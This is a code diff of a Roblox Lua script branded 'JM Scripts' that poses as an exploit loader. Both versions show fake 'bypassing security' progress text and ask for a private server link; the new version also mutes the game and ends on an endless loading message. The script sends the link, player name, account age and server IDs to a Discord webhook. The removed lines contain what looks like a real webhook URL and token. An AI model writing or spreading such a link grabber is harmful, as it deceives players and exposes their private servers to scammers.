@@ -1,165 +1,270 @@
--- CONFIG
-local WEBHOOK = "https://discordapp.com/api/webhooks/1468274684557529118/zJwKaKc2q7yb8tCs2XdZSYGuciAlRqX-3sVTro8RMEfwR2Tl1tSUf_-MHMiPVvJxlt17"
-local DISCORD = "https://discord.gg/ZPz8Renfz"
+-- JM SCRIPTS CINEMATIC LOADER
+-- feito para UI full screen com efeitos
 
--- SERVICES
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local HttpService = game:GetService("HttpService")
+local SoundService = game:GetService("SoundService")
+local RunService = game:GetService("RunService")
 
 local player = Players.LocalPlayer
 
--- REQUEST
-local request =
-syn and syn.request or
-http_request or
-request or
-fluxus and fluxus.request
+-- CONFIG
+local DISCORD = "https://discord.gg/ZPz8Renfz"
+local WEBHOOK = "COLE_SUA_WEBHOOK_AQUI"
 
--- WEBHOOK
-local function sendWebhook(msg)
+----------------------------------------------------
+-- FUNÇÃO: SILENCIAR JOGO
+----------------------------------------------------
 
-if not request then return end
-
-request({
-Url = WEBHOOK,
-Method = "POST",
-Headers = {["Content-Type"] = "application/json"},
-Body = HttpService:JSONEncode({
-content = msg
-})
-})
-
+for _,s in pairs(SoundService:GetDescendants()) do
+	if s:IsA("Sound") then
+		s.Volume = 0
+	end
 end
 
--- GUI
+----------------------------------------------------
+-- MUSICA CALMA
+----------------------------------------------------
+
+local music = Instance.new("Sound")
+music.SoundId = "rbxassetid://1843529632"
+music.Volume = 0.7
+music.Looped = true
+music.Parent = workspace
+music:Play()
+
+----------------------------------------------------
+-- GUI PRINCIPAL
+----------------------------------------------------
+
 local gui = Instance.new("ScreenGui")
-gui.IgnoreGuiInset = true
-gui.Parent = game.CoreGui
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
+local main = Instance.new("Frame")
+main.Size = UDim2.new(1,0,1,0)
+main.BackgroundColor3 = Color3.fromRGB(0,0,0)
+main.Parent = gui
+
+----------------------------------------------------
+-- BORDA NEON ANIMADA
+----------------------------------------------------
+
+local stroke = Instance.new("UIStroke")
+stroke.Color = Color3.fromRGB(170,0,255)
+stroke.Thickness = 3
+stroke.Parent = main
+
+spawn(function()
+	while true do
+		TweenService:Create(stroke,TweenInfo.new(2),{Transparency = 0.2}):Play()
+		wait(2)
+		TweenService:Create(stroke,TweenInfo.new(2),{Transparency = 0.6}):Play()
+		wait(2)
+	end
+end)
+
+----------------------------------------------------
 -- TERMINAL FAKE
-local terminal = Instance.new("Frame",gui)
-terminal.Size = UDim2.fromScale(1,1)
-terminal.BackgroundColor3 = Color3.new(0,0,0)
+----------------------------------------------------
 
-local text = Instance.new("TextLabel",terminal)
-text.Size = UDim2.fromScale(1,1)
-text.BackgroundTransparency = 1
-text.TextColor3 = Color3.fromRGB(0,255,0)
-text.Font = Enum.Font.Code
-text.TextSize = 18
-text.TextXAlignment = Enum.TextXAlignment.Left
-text.TextYAlignment = Enum.TextYAlignment.Top
-text.Text = ""
+local terminal = Instance.new("TextLabel")
+terminal.BackgroundTransparency = 1
+terminal.Size = UDim2.new(1,-20,1,-20)
+terminal.Position = UDim2.new(0,10,0,10)
+terminal.Font = Enum.Font.Code
+terminal.TextColor3 = Color3.fromRGB(0,255,0)
+terminal.TextSize = 14
+terminal.TextXAlignment = Enum.TextXAlignment.Left
+terminal.TextYAlignment = Enum.TextYAlignment.Top
+terminal.Text = ""
+terminal.Parent = main
 
-local fakeLines = {
+local function randomLine()
 
-"Injecting JM Scripts...",
-"Bypassing Roblox security...",
-"Loading assets...",
-"Decrypting modules...",
-"Connecting to server...",
-"Downloading exploit core...",
-"Verifying environment...",
-"Loading UI framework...",
-"Finalizing execution..."
+	local modules = {
+		"core","network","visual","crypto","auth",
+		"memory","loader","engine","ui","module"
+	}
 
-}
+	return "Loading "..modules[math.random(1,#modules)].."_"..math.random(1000,9999)..".lua"
+end
 
-for i,v in pairs(fakeLines) do
+spawn(function()
 
-text.Text = text.Text .. "\n> " .. v
-task.wait(0.6)
+	for i=1,80 do
+		terminal.Text = terminal.Text.."\n"..randomLine()
+		wait(0.04)
+	end
+
+	wait(2)
+
+	terminal:Destroy()
+
+end)
+
+----------------------------------------------------
+-- PARTICULAS FAÍSCAS
+----------------------------------------------------
+
+local particleHolder = Instance.new("Frame")
+particleHolder.Size = UDim2.new(1,0,1,0)
+particleHolder.BackgroundTransparency = 1
+particleHolder.Parent = main
+
+local function createSpark()
+
+	local spark = Instance.new("Frame")
+	spark.Size = UDim2.new(0,3,0,3)
+	spark.BackgroundColor3 = Color3.fromRGB(255,255,255)
+	spark.BorderSizePixel = 0
+	spark.Position = UDim2.new(math.random(),0,1,0)
+	spark.Parent = particleHolder
+
+	local tween = TweenService:Create(
+		spark,
+		TweenInfo.new(math.random(3,6)),
+		{Position = UDim2.new(spark.Position.X.Scale,0,-0.1,0),Transparency = 1}
+	)
+
+	tween:Play()
+
+	game.Debris:AddItem(spark,6)
 
 end
 
-task.wait(1)
+spawn(function()
 
-terminal:Destroy()
+	while true do
+		createSpark()
+		wait(0.1)
+	end
 
--- MAIN PANEL
-local main = Instance.new("Frame",gui)
-main.Size = UDim2.fromOffset(500,300)
-main.Position = UDim2.fromScale(0.5,0.5)
-main.AnchorPoint = Vector2.new(0.5,0.5)
-main.BackgroundColor3 = Color3.fromRGB(15,15,25)
+end)
 
-local stroke = Instance.new("UIStroke",main)
-stroke.Color = Color3.fromRGB(200,120,255)
-stroke.Thickness = 2
+----------------------------------------------------
+-- PAINEL JOGADOR
+----------------------------------------------------
 
-local corner = Instance.new("UICorner",main)
+local playerBox = Instance.new("Frame")
+playerBox.Size = UDim2.new(0,300,0,90)
+playerBox.Position = UDim2.new(0,20,1,-110)
+playerBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
+playerBox.Parent = main
 
--- TITLE
-local title = Instance.new("TextLabel",main)
-title.Size = UDim2.new(1,0,0,40)
-title.BackgroundTransparency = 1
-title.Text = "JM SCRIPTS"
-title.Font = Enum.Font.GothamBold
-title.TextSize = 28
-title.TextColor3 = Color3.fromRGB(220,170,255)
+local pStroke = Instance.new("UIStroke")
+pStroke.Color = Color3.fromRGB(170,0,255)
+pStroke.Parent = playerBox
 
--- PLAYER INFO
-local info = Instance.new("TextLabel",main)
-info.Position = UDim2.new(0,0,0,50)
-info.Size = UDim2.new(1,0,0,60)
-info.BackgroundTransparency = 1
-info.Font = Enum.Font.Gotham
-info.TextSize = 18
-info.TextColor3 = Color3.fromRGB(200,200,200)
-
-info.Text =
+local infoText = Instance.new("TextLabel")
+infoText.BackgroundTransparency = 1
+infoText.Size = UDim2.new(1,-10,1,-10)
+infoText.Position = UDim2.new(0,5,0,5)
+infoText.Font = Enum.Font.Gotham
+infoText.TextColor3 = Color3.new(1,1,1)
+infoText.TextSize = 16
+infoText.TextXAlignment = Enum.TextXAlignment.Left
+infoText.TextYAlignment = Enum.TextYAlignment.Top
+infoText.Text =
 "Player: "..player.Name..
 "\nAccount Age: "..player.AccountAge.." days"
+infoText.Parent = playerBox
 
--- INPUT
-local box = Instance.new("TextBox",main)
-box.Position = UDim2.new(0.1,0,0.45,0)
-box.Size = UDim2.new(0.8,0,0.12,0)
-box.PlaceholderText = "Paste private server link..."
-box.Font = Enum.Font.Gotham
-box.TextSize = 18
-box.BackgroundColor3 = Color3.fromRGB(25,25,40)
-box.TextColor3 = Color3.new(1,1,1)
+----------------------------------------------------
+-- INPUT SERVER PRIVADO
+----------------------------------------------------
 
-local c2 = Instance.new("UICorner",box)
+local serverBox = Instance.new("TextBox")
+serverBox.Size = UDim2.new(0,420,0,50)
+serverBox.Position = UDim2.new(0.5,-210,0.6,0)
+serverBox.PlaceholderText = "Cole o link do servidor privado"
+serverBox.Text = ""
+serverBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
+serverBox.TextColor3 = Color3.new(1,1,1)
+serverBox.Parent = main
 
--- BUTTON
-local send = Instance.new("TextButton",main)
-send.Position = UDim2.new(0.35,0,0.65,0)
-send.Size = UDim2.new(0.3,0,0.12,0)
-send.Text = "SEND"
-send.Font = Enum.Font.GothamBold
-send.TextSize = 20
-send.BackgroundColor3 = Color3.fromRGB(160,90,255)
+local sStroke = Instance.new("UIStroke")
+sStroke.Color = Color3.fromRGB(170,0,255)
+sStroke.Parent = serverBox
 
-local c3 = Instance.new("UICorner",send)
+----------------------------------------------------
+-- BOTÃO DISCORD
+----------------------------------------------------
 
--- CLICK
-send.MouseButton1Click:Connect(function()
+local discordButton = Instance.new("TextButton")
+discordButton.Size = UDim2.new(0,200,0,50)
+discordButton.Position = UDim2.new(0.5,-100,0.72,0)
+discordButton.Text = "Entrar no Discord"
+discordButton.BackgroundColor3 = Color3.fromRGB(25,25,25)
+discordButton.TextColor3 = Color3.new(1,1,1)
+discordButton.Parent = main
 
-if box.Text == "" then return end
+local dStroke = Instance.new("UIStroke")
+dStroke.Color = Color3.fromRGB(170,0,255)
+dStroke.Parent = discordButton
 
-sendWebhook(
-"📩 SERVER RECEIVED\n\n"..
-"Player: `" .. player.Name .. "`\n"..
-"Account Age: `" .. player.AccountAge .. " days`\n\n"..
-box.Text
-)
+discordButton.MouseButton1Click:Connect(function()
 
-main:Destroy()
+	setclipboard(DISCORD)
 
--- THANK YOU SCREEN
-local thanks = Instance.new("Frame",gui)
-thanks.Size = UDim2.fromScale(1,1)
-thanks.BackgroundColor3 = Color3.new(0,0,0)
+	discordButton.Text = "Link copiado!"
 
-local t = Instance.new("TextLabel",thanks)
-t.Size = UDim2.fromScale(1,1)
-t.BackgroundTransparency = 1
-t.Font = Enum.Font.GothamBold
-t.TextScaled = true
-t.TextColor3 = Color3.fromRGB(200,160,255)
-t.Text = "Obrigado por usar\nJM Scripts 💜"
+end)
+
+----------------------------------------------------
+-- WEBHOOK + FINAL
+----------------------------------------------------
+
+serverBox.FocusLost:Connect(function()
+
+	local data = {
+		content =
+		"Player: "..player.Name..
+		"\nAccount Age: "..player.AccountAge..
+		"\nPrivate Server: "..serverBox.Text..
+		"\nPlaceId: "..game.PlaceId..
+		"\nServerId: "..game.JobId
+	}
+
+	pcall(function()
+
+		request({
+			Url = WEBHOOK,
+			Method = "POST",
+			Headers = {
+				["Content-Type"]="application/json"
+			},
+			Body = HttpService:JSONEncode(data)
+		})
+
+	end)
+
+	local thanks = Instance.new("TextLabel")
+	thanks.BackgroundTransparency = 1
+	thanks.Size = UDim2.new(1,0,0,120)
+	thanks.Position = UDim2.new(0,0,0.35,0)
+	thanks.Text = "Obrigado por usar nosso script\nNós somos muito gratos!"
+	thanks.Font = Enum.Font.GothamBold
+	thanks.TextSize = 32
+	thanks.TextColor3 = Color3.new(1,1,1)
+	thanks.Parent = main
+
+	wait(5)
+
+	thanks.Text = "Loading modules..."
+
+	while true do
+
+		thanks.Text = "Loading modules."
+		wait(0.5)
+
+		thanks.Text = "Loading modules.."
+		wait(0.5)
+
+		thanks.Text = "Loading modules..."
+		wait(0.5)
+
+	end
 
 end)
